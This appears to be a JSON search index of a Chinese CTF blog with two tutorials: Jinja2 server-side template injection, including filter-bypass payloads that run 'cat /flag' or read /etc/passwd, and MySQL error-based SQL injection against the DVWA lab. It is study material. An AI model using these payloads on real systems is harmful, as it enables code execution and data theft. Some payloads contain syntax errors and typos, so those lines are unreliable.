[{"categories":["CTF"],"content":"SSTI 漏洞成因 ssti 服务端模板注入成因为：web 应用在使用框架（如 python 的 flask、jinjia2、django；java 的 freemarker、velocity；php 的 thinkphp、smarty 等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。 ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:1:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"SSTI 中常用魔术方法 __class__ 返回一个实例所属的类 __mro__ 查看类继承的所有父类，直到 object __subclasses__() 获取一个类的子类，返回的是一个列表 __bases__ 以元组形式返回一个类直接继承的类 __init__ 类实例创建之后调用，对当前对象的实例的初始化 __globals__ 使用方式为函数名.__globals__，返回一个当前空间下能使用的模块、方法和变量的字典 __getattribute__ 当类被调用时，无条件进入此函数 __getattr__ 访问对象中不存在的属性时调用 __dict__ 返回所有属性，包括属性、方法等 __builtins__ 查看当前所有导入的内建函数 ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:2:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"攻击思路 ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:3:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"获取基本类 dict //返回类中的函数和属性，父类子类互不影响 base //返回类的父类 python3 mro //返回类继承的元组，(寻找父类) python3 init //返回类的初始化方法 subclasses() //返回类中仍然可用的引用 python3 globals //对包含函数全局变量的字典的引用 python3 对于返回的是类实例的话: class //返回实例的对象，可以使类实例指向 Class，使用上面的魔术方法 ''.__class__.__mro__[-1] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:4:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"获取基本类后，继续获取基本类的子类 object.subclasses() ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:5:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"找__init__类 ''.__class__.__mro__[2].__subclasses__()[99].__init__ ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:6:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"查看其引用__builtins__ ''.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__['__builtins__'] ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:7:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能 ''.__class__.__mro[2].subclasses()[138].init.globals['builtins']['file']('/etc/passwd').read() ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:8:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"常用目标函数 file、subprocess.Popen、os.popen、exec、eval ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:9:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"绕过过滤方法 ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:10:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤中括号 魔术方法__getitem__可替代中括号 当中括号被过滤时，如下将被限制访问: {{''.__class__.__base__.__subclasses__()['xx'].['popen']('cat /flag')}} 可用**getitem**替换中括号[]: {{''.__class__.__base__.__subclasses__().__getitem__(13).__getitem__('popen')('cat /flag')}} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:11:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤下划线 原 payload 被限制: {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }} 1.使用 attr()绕过，payload: {{ () | attr(request.args.a) | attr(request.args.b) | attr(request.args.c) | attr(request.args.d) | attr(request.args.e)()['popen']('cat /flag') | attr('read')() }} 同时 get 方法传参?a=__class__\u0026b=__base__\u0026c=__subclasses__\u0026d=__init__\u0026e=__globals__ 2.将下划线进行编码绕过，payload: {{ ().['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fbase\\x5f\\x5f']['\\x5f\\x5fsubclasses\\x5f\\x5f']()[xx]['\\x5f\\x5finit\\x5f\\x5f'].['\\x5f\\x5fglobals\\x5f\\x5f']['popen']('cat /flag') }} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:12:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤点 原 payload 被限制: {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }} 1.使用 attr()绕过，payload: {{ () | attr('__class__') | attr('__base__') | attr('__subclasses__')() | attr('__getitem__')(xx) | attr('__init__') | attr('__globals__') | attr('__getitem__')('popen')('cat /flag') | attr('read')()}} 2. 使用中括号绕过，payload: {{ ()['__class__']['__base__']['__subclasses__']()[xx]['__init__']['__globals__']['popen']('cat /flag')['read']()}} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:13:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤大括号 使用{%%}替代{{}}，payload: {% print(''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read()) %} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:14:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤引号 当'被过滤后以下访问将被限制 {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }} 1.通过 request.args 的 get 传参输入引号内的内容，payload： {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[request.args.popen](request.args.cmd).read() }} 同时 get 传参?popen=popen\u0026cmd=cat /flag 2.通过 request.form 的 post 传参输入引号内的内容，payload： {{ ().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.popen](request.form.cmd).read() }} 同时 post 传参?popen=popen\u0026cmd=cat /flag 3.使用 cookies 传参，如 request.cookies.k1、request.cookies.k2、k1=popen;k2=cat /flag 也可将下划线进行 ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:15:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤数字 使用过滤器 length 绕过 {% set a='aaa' | lenth %}{{ ().__class__.__base__.__subclasses__()[a]}} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:16:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"过滤函数名 1.使用拼接绕过，payload: {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['pop'+'en']('cat /fl' + 'ag').read() }} 2.16进制编码绕过，payload: {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['\\x70\\x6f\\x70\\x65\\x6e']('cat /flag').read() }} 3.base64编码绕过，payload: {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[base64.b64decode('cG9wZW4=').decode()]('cat /fl' + 'ag').read() }} ","date":"2025-04-20","objectID":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/:17:0","tags":["SSTI注入","web"],"title":"SSTI注入篇","uri":"/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"SQL 注入常用函数 联合注入函数: concat() concat_ws() group_concat() 布尔盲注函数: length() left() right() substr() mid() ascii() ord() 时间盲注函数: sleep() if() 报错注入函数: floor() exp() updatexml() extractvalue() ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:1:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"(一)注入类型 SQL 注入通常分为两种类型：数字型和字符型 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:2:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"(1)注入类型为数字型时，SQL 查询语句通常为： select * from users where id = x 判断方法： 1. ?id = 1 and 1 = 1 --+ 若无报错，继续下一步 2. ?id = 1 and 1 = 2 --+ 若报错， 则注入类型为数字型 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:3:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"(2)注入类型为字符型时，SQL 查询语句通常为： select * from users where id = '1' 判断方法： 1. ?id = 1' and '1' = '1 --+ 若无报错，继续下一步 2. ?id = 1' and '1' = '2 --+ 若报错， 则注入类型为字符型 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:4:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"(二)报错注入 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:5:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"一、SQL 报错注入常用函数： updatexml（）、extractvalue（）、floor（） (1) updatexml（）函数 updatexml（）使用不同的 xml 标记匹配和替换 xml 块，用于改变文档中符合条件的节点的值 基本语法：UPDATEXML(xml_target, xpath_expr, new_val)，xml_target是要修改的 XML 类型的数据，xpath_expr是一个 XPath 表达式，用于指定要修改的节点位置，new_val是一个新的节点值，用于替换当前节点的值 若 xpath_string 格式出现错误，mysql 会报出 xpath 语法错误，即（xpath syntax） 例如：select * from users where id = 1 and (updatexml(1,0x7e,3));0x7e 是字符~，不属于 xpath 语法格式，因此会出现 xpath 语法错误 (2) extractvalue（）函数 extractvalue（）用于从 XML 文档中提取信息 基本语法：ExtractValue(XML_fragment, XPath_string)，其中XML_fragment是 XML 格式的字符串，XPath_string是用于定位 XML 文段中特定数据的 XPath 表达式 若 xpath_string 格式出现错误，mysql 会报出 xpath 语法错误，即（xpath syntax） 例如：select * from users where id = 1 and (extractvalue(1,0x7e)); (3) floor（）函数 floor（）利用select count(*),(floor(rand(0)*2)) as x from 表名 group by x;导致数据库报错，通过 concat 函数连接注入语句与 floor(rand(0)*2)函数，实现将注入结果与报错信息回显 count(*) 是一个聚合函数，用来计算表中所有行的数量，floor(rand(0)*2)产生的固定序列为：01101，结合 group by 会产生一个虚拟表。 原理：rand 伪随机函数与order by或group by函数的冲突，例如 floor(rand(0)*2)一开始计算得到了 0，group by 根据 0 分类统计，在写入要返回的虚表时 floor(rand(0)*2)还要计算一次结果，这次结果却是 1，导致了冲突。 ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:6:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"二、updatexml 函数实战（基于 dvwa 靶场） 1.爆数据库和用户名：1' and updatexml(1,concat(0x7e,database(),0x7e,user()),1)# 输出结果： 2.爆当前数据库的表信息：1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)# 输出结果： 3.爆 dvwa 数据库中的 user 表的字段信息：1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'),0x7e),1)# 输出结果： 4.爆数据库内容：1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e),1)# 输出结果： ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:7:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"三、extractvalue 函数实战（基于 dvwa 靶场） 1.爆数据库和用户名：1' and extractvalue(1,concat(0x7e,database(),0x7e,user()))# 输出结果： 2.爆当前数据库的表信息：1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database())))# 输出结果： 3.爆 dvwa 数据库中的 user 表的字段信息：1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users')))# 输出结果： 4.爆数据库内容：1' and extractvalue(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e))# 输出结果： ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:8:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"},{"categories":["CTF"],"content":"四、floor 函数实战 (基于 dvwa 靶场) 1.判断是否存在报错注入：1' union select count(*),floor(rand(0)*2) x from information_schema.tables group by x# 输出结果： 确认存在报错注入 2.爆当前数据库名：1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x # 输出结果： 可以看到数据库名为 dvwa，1 是随机数 3.爆当前数据库表信息：1' union select count(*),concat(floor(0)*2,0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)) x from information_schema.schemata group by x# 输出结果： 4.爆数据库表中字段信息：1' union select count(*),concat(floor(rand(0)*2),0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1)) x from information_schema.schemata group by x# 输出结果： 5.爆数据库内容：1' union select count(*),concat(floor(rand(0)*2),(select group_concat(first_name,last_name) from dvwa.users)) x from information_schema.schemata group by x# 输出结果： ","date":"2025-04-19","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/:9:0","tags":["SQL注入","web"],"title":"SQL注入篇","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/"}]